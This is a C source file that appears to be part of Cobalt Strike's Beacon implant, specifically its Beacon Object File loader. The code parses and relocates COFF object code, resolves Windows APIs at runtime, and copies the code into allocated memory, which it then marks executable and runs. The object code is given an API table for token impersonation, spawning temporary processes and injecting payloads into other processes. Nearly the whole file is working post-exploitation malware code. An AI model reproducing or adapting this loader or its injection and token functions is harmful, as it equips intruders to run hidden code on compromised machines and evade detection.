/*
 * Beacon Object File Format (BOFFs)
 *
 * OK, this is just a PE/COFF file parsed and linked by Cobalt Strike's Beacon. It's nothing too special.
 * This is the code to make all of it work though.
 */
#include <Windows.h>
#include <stdio.h>
#include "commands.h"
#include "beacon.h"
#include "parse.h"
#include "inject.h"
#include "bformat.h"

#define RELOC_ENDTABLE 0
#define RELOC_ADDR32   6
#define RELOC_REL32    20
#define RELOC64_REL32_0  4
#define RELOC64_REL32_1  5
#define RELOC64_REL32_2  6
#define RELOC64_REL32_3  7
#define RELOC64_REL32_4  8
#define RELOC64_REL32_5  9

#define SYMBOL_RDATA         1024
#define SYMBOL_DATA          1025
#define SYMBOL_TEXT          1026
#define SYMBOL_DYNAMICF      1027
#define SYMBOL_END           1028

static void postmsgf(int type, char * fmt, ...) {
	va_list va;
	int     est;
	char *  buff;

	/* how much data do we expect to stuff into this buffer? */
	va_start(va, fmt);
	est = _vscprintf(fmt, va);
	va_end(va);

	/* let's sanity check the data */
	if (est <= 0)
		return;

	/* malloc data for our output... */
	buff      = (char *)malloc(est+1);
	buff[est] = 0;

	/* build up our output. */
	va_start(va, fmt);
	vsprintf_s(buff, est+1, fmt, va);
	va_end(va);

	/* post it */
	command_shell_callback(buff, est, type);

	/* clear&free our memory */
	memset(buff, 0, est);
	free(buff);
}

static BOOL use_token_a(HANDLE token) {
	BOOL result;
	char * mem = (char*)malloc(256);
	memset(mem, 0, 256);

	result = use_token(token, mem, 256);

	/* clear&free our memory */
	memset(mem, 0, 256);
	free(mem);

	return result;
}

static void postmsg(int type, char * msg, int len) {
	command_shell_callback(msg, len, type);
}

void spawn_populate(BOOL x86, char * cmdbuff);

static void getspawnproc(BOOL x86, char * buff, int len) {
	char proc[256];
	spawn_populate(x86, proc);

	if (len < 256) {
		memcpy(buff, proc, len);
	}
	else {
		memcpy(buff, proc, 256);
	}
}

static void inject_temp_process(PROCESS_INFORMATION * pi, char * payload, int plen, int off, char * arg, int alen) {
	inject_process_logic(pi, pi->hProcess, pi->dwProcessId, payload, plen, off, arg, alen);
}

static void inject_explicit_process(HANDLE hProcess, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len) {
	inject_process_logic(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
}

typedef struct {
	short type;
	short symbol;
	int   offset;
	int   offset_in_section;
} OBJ_RELOC;

typedef struct {
	/* APIs to resolve Win32 modules */
	HMODULE (WINAPI *LoadLibraryA)(__in LPCSTR file);
	BOOL    (WINAPI *FreeLibrary)(HMODULE hLibModule);
	FARPROC (WINAPI *GetProcAddress)(HMODULE hModule, LPCSTR proc);
	HMODULE (WINAPI *GetModuleHandleA)(LPCSTR);

	/* data parser API */
	void    (*BeaconDataParse)(datap *, char * buffer, int size);
	char *  (*BeaconDataPtr)(datap *, int size);
	int     (*BeaconDataInt)(datap *);
	short   (*BeaconDataShort)(datap *);
	int     (*BeaconDataLength)(datap *);
	char *  (*BeaconDataExtract)(datap *, int * size);

	/* string builder API */
	void      (*BeaconFormatAlloc)(formatp * format, int maxsz);
	void      (*BeaconFormatReset)(formatp * format);
	void      (*BeaconFormatAppend)(formatp * format, char * text, int len);
	void      (*BeaconFormatPrintf)(formatp * format, char * fmt, ...);
	char *    (*BeaconFormatToString)(formatp * format, int * size);
	void      (*BeaconFormatFree)(formatp * format);
	void      (*BeaconFormatInt)(formatp * format, int value);

	/* Output Functions */
	void    (*BeaconOutput)(int type, char * msg, int len);
	void    (*BeaconPrintf)(int type, char * fmt, ...);
	void    (*BeaconErrorD)(int type, int arg);
	void    (*BeaconErrorDD)(int type, int arg, int arg2);
	void    (*BeaconErrorNA)(int type);

	/* Token Functions */
	BOOL    (*BeaconUseToken)(HANDLE token);
	void    (*BeaconRevertToken)();
	BOOL    (*BeaconIsAdmin)();

	/* Spawn and Inject */
	void   (*BeaconGetSpawnTo)(BOOL x86, char * buffer, int length);
	void   (*BeaconInjectProcess)(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
	void   (*BeaconInjectTemporaryProcess)(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
	BOOL   (*BeaconSpawnTemporaryProcess)(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);
	void   (*BeaconCleanupProcess)(PROCESS_INFORMATION * pInfo);

	/* Utility Functions */
	BOOL   (*toWideChar)(char * src, wchar_t * dst, int max);

	/* our other pointers */
	void * other[32];
} BOFF_FUNCTIONS;

void * function_slot(BOFF_FUNCTIONS * f, void * ptr) {
	int x;

	/* try and find our pointer and return a pointer to it! */
	for (x = 0; x < 32; x++) {
		if (f->other[x] == ptr)
			return &(f->other[x]);
	}

	/* boo... OK, find a NULL pointer and return a pointer to that */
	for (x = 0; x < 32; x++) {
		if (f->other[x] == NULL) {
			f->other[x] = ptr;
			return &(f->other[x]);
		}
	}

	return NULL;
}

void setup_functions(BOFF_FUNCTIONS * f) {
	/* clear all of these pointers, please */
	memset(f, 0, sizeof(BOFF_FUNCTIONS));

	/* setup some of our fixed APIs */
	f->LoadLibraryA      = LoadLibraryA;
	f->FreeLibrary       = FreeLibrary;
	f->GetProcAddress    = GetProcAddress;
	f->GetModuleHandleA  = GetModuleHandleA;

	/* data parser API */
	f->BeaconDataParse   = data_init;
	f->BeaconDataPtr     = data_ptr;
	f->BeaconDataInt     = reinterpret_cast<int (*)(datap *)>(data_int);
	f->BeaconDataShort   = reinterpret_cast<short (*)(datap*)>(data_short);
	f->BeaconDataLength  = data_length;
	f->BeaconDataExtract = data_ptr_extract;

	/* beacon format API */
	f->BeaconFormatAlloc    = bformat_init;
	f->BeaconFormatReset    = bformat_reset;
	f->BeaconFormatPrintf   = bformat_printf;
	f->BeaconFormatAppend   = bformat_copy;
	f->BeaconFormatFree     = bformat_free;
	f->BeaconFormatToString = bformat_tostring;
	f->BeaconFormatInt      = bformat_int;

	/* our output function */
	f->BeaconOutput      = postmsg;
	f->BeaconPrintf      = postmsgf;
	f->BeaconErrorD      = post_error_d;
	f->BeaconErrorDD     = post_error_dd;
	f->BeaconErrorNA     = post_error_na;

	/* token API */
	f->BeaconUseToken    = use_token_a;
	f->BeaconIsAdmin     = is_admin;
	f->BeaconRevertToken = command_rev2self;

	/* spawn and inject APIs */
	f->BeaconGetSpawnTo             = getspawnproc;
	f->BeaconCleanupProcess         = cleanupProcess;
	f->BeaconInjectProcess          = inject_explicit_process;
	f->BeaconSpawnTemporaryProcess = spawn_patsy;
	f->BeaconInjectTemporaryProcess = inject_temp_process;

	/* utility functions */
	f->toWideChar                   = toWideChar;
}

/*
 * These get somewhat complicated. Here's what the variables mean:
 *
 * execsrc - the current source of our .text section/executable code. We need to lift offsets from this memory
 * execdst - the planned destination of our .text section/executable code. It may not be populated yet. But, we may need to calculate offsets relative to it.
 * symbol  - a pointer to the symbol we're processing a relocation for.
 *
 * Return value: if value is false, relocation process failed and the BOFF should not execute. This function reports its own errors.
 */
BOOL process_reloc(OBJ_RELOC * reloc, char * execsrc, char * execdst, char * symbol, int soff) {
#if defined _M_IX86
	if (reloc->type == RELOC_ADDR32) {
		DWORD addr, offset, rip;

		memcpy(&offset, execsrc + reloc->offset, 4);
		addr = (DWORD)symbol + (DWORD)offset + soff;
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
	else if (reloc->type == RELOC_REL32) {
		DWORD addr, offset, rip;

		/* calculate the RIP of where this data will be ref'd from */
		rip = (DWORD)execdst + reloc->offset + 4;

		/* calculate the location of our rdata */
		memcpy(&offset, execsrc + reloc->offset, 4);
		addr = (DWORD)symbol + (DWORD)offset + soff;

		/* figure out the difference between rip and addr */
		addr = addr - rip;

		/* copy it back in... */
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
#elif defined _M_X64
	if (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5) {
		char * rip, * fsymbol;
		DWORD offset, addr;
		INT64 check;

		/* calculate the RIP of where this data will be ref'd from */
		rip = (char *)execdst + reloc->offset + reloc->type;

				/* OK, this is confusing, but... here goes... RELOC64_REL32_0 means we want
				 * the RIP at the end of this total encoded instruction AND our offset is
				 * the last 4 bytes of this encoded instruction. The other offsets after 0
				 * mean there are additional bytes within this encoded instruction and our
				 * relocation offset is tucked into the middle of that instruction. We just
				 * treat reloc->type as a offset to the next instruction following where our
				 * patched relocation offset begins. */

		/* calculate the location of our rdata */
		memcpy(&offset, execsrc + reloc->offset, 4);
		fsymbol = (char *)symbol + offset + soff;

		/* figure out the difference between rip and addr */
		addr = (DWORD)((char *)fsymbol - (char *)rip);

		/* verify that our rip/addr offset can fit in 4b. If it can't, we have a problem and we need to bail */
		check = (INT64)fsymbol - (INT64)rip;

		if (check > INT_MAX || check < INT_MIN) {
			//dlog("0x4d (reloction): symbol@ %p code@ %p  distance: %p", fsymbol, rip, check);
			post_error_na(0x4d);
			return FALSE;
		}

		/* copy it back in... */
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
#endif
	else {
		post_error_d(0x4f, reloc->type);
		return FALSE;
	}
}

//void print_reloc(OBJ_RELOC * r) {
	//dlog("Reloc[type: %d, symbol: %d, offset: %d, offset_in_section: %d]", r->type, r->symbol, r->offset, r->offset_in_section);
//}

void command_inline_execute_object(char * buffer, int length) {
	/* our arguments */
	datap        parser;
	datap        relocsparser;
	DWORD        entry;
	datap_buffer code;
	datap_buffer rdata;
	datap_buffer data;
	datap_buffer relocs;
	datap_buffer args;

	/* the functions we plan to call */
	BOFF_FUNCTIONS * ftable;

	/* stuff we need */
	void(*inlinefunc)(char * buffer, int length);
	char       * execpatch;
	OBJ_RELOC  * reloc;
	BOOL         success = FALSE; /* Assume failure walking our relocations and fix code.buffer */

	/* setup our function table */
	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
	setup_functions(ftable);

	/* extract our arguments */
	data_init(&parser, buffer, length);
	entry  = data_int(&parser);
	code   = data_extract(&parser);
	rdata  = data_extract(&parser);
	data   = data_extract(&parser);
	relocs = data_extract(&parser);
	args   = data_extract(&parser);

	/* init and copy over to it */
	execpatch = (char *)VirtualAlloc(NULL, code.length, MEM_RESERVE | MEM_COMMIT, setting_short(SETTING_PROCINJ_PERMS_I));
	if (execpatch == NULL) {
		free(ftable);
		return;
	}

	/* initialize a parser for our relocations */
	data_init(&relocsparser, relocs.buffer, relocs.length);

	/* walk our relocations and fix code.buffer */
	while (TRUE) {
		/* grab our relocation object */
		reloc = (OBJ_RELOC *)data_ptr(&relocsparser, sizeof(OBJ_RELOC));

		//print_reloc(reloc);

		/* we're done successfully */
		if (reloc->symbol == SYMBOL_END) {
			success = TRUE;
			break;
		}
		/* pointer to .rdata which has all of our strings */
		else if (reloc->symbol == SYMBOL_RDATA) {
			if (!process_reloc(reloc, code.buffer, execpatch, rdata.buffer, reloc->offset_in_section))
				break;
		}
		else if (reloc->symbol == SYMBOL_DATA) {
			if (!process_reloc(reloc, code.buffer, execpatch, data.buffer, reloc->offset_in_section))
				break;
		}
		else if (reloc->symbol == SYMBOL_TEXT) {
			if (!process_reloc(reloc, code.buffer, execpatch, execpatch, reloc->offset_in_section))
				break;
		}
		else if (reloc->symbol == SYMBOL_DYNAMICF) {
			/* we need to rip the function name and module handle out */
			char * lib;
			char * fun;
			void * ptr;
			void * slot;
			HMODULE mod;

			/* grab our library and function name */
			lib = data_string_asciiz(&relocsparser);
			fun = data_string_asciiz(&relocsparser);

			/* resolve our module */
			mod = GetModuleHandleA(lib);
			if (mod == NULL)
				mod = LoadLibraryA(lib);

			/* resolve our function */
			ptr = GetProcAddress(mod, fun);
			if (ptr == NULL) {
				post_error(0x4c, "%s!%s", lib, fun);
				break;
			}

			/* find a slot for our dynamically resolved function */
			slot = function_slot(ftable, ptr);
			if (slot == NULL) {
				post_error_na(0x4e);
				break;
			}

			/* patch in this dynamically resolved symbol */
			if (!process_reloc(reloc, code.buffer, execpatch, (char *)slot, 0))
				break;
		}
		/* request for something in our function table */
		else {
			if (!process_reloc(reloc, code.buffer, execpatch, (char *)ftable + (reloc->symbol * sizeof(char *)), 0))
				break;
		}
	}

	if (success) {
		/* copy payload to our area */
		memcpy(execpatch, code.buffer, code.length);

		/* in case we have a crash, let's not have our code co-located with strings and such */
		memset(code.buffer, 0, code.length);

		/* cast our inline func, please */
		inlinefunc = (void(*)(char * buffer, int length))(execpatch + entry);

		/* make the patch executable now */
		if (finalize_memory_permissions(execpatch, code.length)) {
			/* call it */
			//__debugbreak();
			inlinefunc(args.buffer, args.length);
		}
	}

	/* OK, cleanup! */
	VirtualFree(execpatch, 0, MEM_RELEASE);

	/* kill our table */
	free(ftable);
}